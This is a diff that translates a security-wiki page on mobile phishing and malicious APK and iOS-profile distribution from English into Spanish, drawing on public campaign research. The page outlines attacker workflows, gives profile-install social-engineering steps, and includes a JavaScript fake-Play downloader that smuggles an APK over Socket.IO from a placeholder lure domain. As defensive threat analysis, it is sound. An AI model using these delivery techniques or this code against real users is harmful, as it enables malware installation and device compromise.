@@ -1,51 +1,51 @@
-# Mobile Phishing & Malicious App Distribution (Android & iOS)
+# Phishing móvil y distribución de apps maliciosas (Android e iOS)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!INFO]
-> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
-> The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.
+> Esta página cubre técnicas utilizadas por threat actors para distribuir **APK maliciosos de Android** y **perfiles de configuración móvil de iOS** mediante phishing (SEO, ingeniería social, tiendas falsas, dating apps, etc.).
+> El material está adaptado de la campaña SarangTrap expuesta por Zimperium zLabs (2025) y otras investigaciones públicas.<sup>[[1]](#references)</sup>
 
-## Attack Flow
+## Flujo de ataque
 
-1. **SEO/Phishing Infrastructure**
-* Register dozens of look-alike domains (dating, cloud share, car service…).
-– Use local language keywords and emojis in the `<title>` element to rank in Google.
-– Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
-2. **First Stage Download**
-* Android: direct link to an *unsigned* or “third-party store” APK.
-* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
-3. **Android Post-install Behaviour**
-* C2-gated execution, permission abuse, dropper bypasses, background collection, and other post-install malware behaviour are covered in the dedicated Android Malware Post-Exploitation page below.
-4. **iOS Delivery Technique**
-* A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.
-* Social-engineering instructions:
-1. Open Settings ➜ *Profile downloaded*.
-2. Tap *Install* three times (screenshots on the phishing page).
-3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
-5. **iOS Web Clip Payload (phishing app icon)**
-* `com.apple.webClip.managed` payloads can **pin a phishing URL to the Home Screen** with a branded icon/label.
-* Web Clips can run **full‑screen** (hides the browser UI) and be marked **non‑removable**, forcing the victim to delete the profile to remove the icon.
-6. **Network Layer**
-* Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
-* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).
+1. **Infraestructura de SEO/Phishing**
+* Registrar docenas de dominios similares (dating, cloud share, car service…).
+– Utilizar palabras clave en el idioma local y emojis en el elemento `<title>` para posicionarse en Google.
+– Alojar las instrucciones de instalación de Android (`.apk`) y iOS en la misma landing page.
+2. **Descarga de la primera fase**
+* Android: enlace directo a un APK *unsigned* o de una “third-party store”.
+* iOS: enlace `itms-services://` o HTTPS normal a un perfil **mobileconfig** malicioso (ver abajo).
+3. **Comportamiento posterior a la instalación en Android**
+* La ejecución controlada por C2, el abuso de permisos, los bypasses de droppers, la recopilación en segundo plano y otros comportamientos de malware posteriores a la instalación se describen en la página dedicada a Android Malware Post-Exploitation que aparece abajo.
+4. **Técnica de entrega en iOS**
+* Un único **perfil de configuración móvil** puede solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., para inscribir el dispositivo en una supervisión similar a “MDM”.
+* Instrucciones de ingeniería social:
+1. Abrir Settings ➜ *Profile downloaded*.
+2. Pulsar *Install* tres veces (capturas de pantalla en la página de phishing).
+3. Confiar en el perfil unsigned ➜ el atacante obtiene privilegios de *Contacts* y *Photo* sin la revisión de App Store.
+5. **Payload Web Clip de iOS (icono de app de phishing)**
+* Los payloads `com.apple.webClip.managed` pueden **anclar una URL de phishing a la Home Screen** con un icono/etiqueta personalizada.
+* Los Web Clips pueden ejecutarse en **pantalla completa** (oculta la interfaz del navegador) y marcarse como **no eliminables**, obligando a la víctima a eliminar el perfil para quitar el icono.<sup>[[3]](#references)</sup>
+6. **Capa de red**
+* HTTP normal, a menudo en el puerto 80 con un encabezado HOST como `api.<phishingdomain>.com`.
+* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sin TLS → fácil de detectar).
 
 ## Android Malware Post-Exploitation
 
-For post-install Android malware tradecraft such as C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS, and persistence, see:
+Para tradecraft de malware de Android posterior a la instalación, como C2, abuso de Accessibility, overlays, automatización ATS, carga de DEX por etapas, SMS premium y persistencia, consulta:
 
 {{#ref}}
 ../basic-forensic-methodology/android-malware-post-exploitation.md
 {{#endref}}
 
-## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
+## Smuggling de APK basado en Socket.IO/WebSocket + páginas falsas de Google Play
 
-Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.
+Los atacantes sustituyen cada vez más los enlaces estáticos a APK por un canal Socket.IO/WebSocket integrado en señuelos con apariencia de Google Play. Esto oculta la URL del payload, evita los filtros de URL/extensión y mantiene una UX de instalación realista.<sup>[[2]](#references)[[4]](#references)</sup>
 
-Typical client flow observed in the wild:
+Flujo típico del cliente observado en entornos reales:
 
 <details>
-<summary>Socket.IO fake Play downloader (JavaScript)</summary>
+<summary>Downloader falso de Play basado en Socket.IO (JavaScript)</summary>
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -67,12 +67,12 @@ document.body.appendChild(a); a.click();
 ```
 </details>
 
-Por qué evade controles simples:
-- No se expone una URL estática de APK; el payload se reconstruye en memoria a partir de frames de WebSocket.
-- Los filtros de URL/MIME/extensión que bloquean respuestas directas .apk pueden pasar por alto datos binarios tunelizados mediante WebSockets/Socket.IO.
+Por qué evade los controles simples:
+- No se expone ninguna URL de APK estática; el payload se reconstruye en memoria a partir de frames de WebSocket.
+- Los filtros de URL/MIME/extensión que bloquean respuestas .apk directas pueden pasar por alto datos binarios tunelizados mediante WebSockets/Socket.IO.
 - Los crawlers y sandboxes de URL que no ejecutan WebSockets no recuperarán el payload.
 
-Ver también técnicas y tooling de WebSocket:
+Consulta también las técnicas y herramientas de WebSocket:
 
 {{#ref}}
 ../../pentesting-web/websocket-attacks.md
@@ -81,9 +81,9 @@ Ver también técnicas y tooling de WebSocket:
 
 ## Referencias
 
-
-- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
-- [Socket.IO](https://socket.io)
-- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
+- [1] [El lado oscuro del romance: campaña de extorsión SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
+- [2] [Socket.IO](https://socket.io)
+- [3] [Configuración del payload de Web Clips para dispositivos Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
+- [4] [Troyano bancario dirigido a usuarios de Android de Indonesia y Vietnam](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 
 {{#include ../../banners/hacktricks-training.md}}
